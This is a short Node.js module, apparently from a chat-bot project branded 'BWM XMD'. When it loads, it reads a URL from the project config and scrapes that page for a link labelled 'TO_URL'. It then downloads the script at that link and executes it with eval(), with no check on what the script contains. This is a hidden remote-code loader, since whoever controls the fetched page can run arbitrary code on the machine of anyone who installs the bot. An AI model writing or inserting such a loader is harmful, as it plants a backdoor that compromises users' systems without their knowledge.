 // 🇧​​​​​🇼​​​​​🇲​​​​​ 🇽​​​​​🇲​​​​​🇩​​​​​

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require(__dirname + "/../config");

async function fetchToUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const toUrlElement = $('a:contains("TO_URL")');
    const toUrl = toUrlElement.attr('href');

    if (!toUrl) {
      throw new Error('To URL link not found...');
    }

    console.log('To URL fetched successfully ✅');

    const scriptResponse = await axios.get(toUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Error:', error.message);
  }
}

fetchToUrl();
